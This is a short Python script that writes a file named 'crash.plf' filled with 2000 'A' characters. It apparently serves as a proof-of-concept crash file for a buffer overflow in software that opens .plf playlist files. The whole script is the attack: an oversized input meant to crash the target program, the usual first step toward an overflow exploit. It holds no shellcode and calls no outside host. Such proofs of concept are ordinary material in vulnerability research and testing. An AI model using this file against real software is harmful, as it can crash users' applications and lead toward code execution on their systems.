#!/usr/bin/env python

filename="crash.plf"
buffer = "A"*2000
textfile = open(filename, 'w')
textfile.write(buffer)
textfile.close()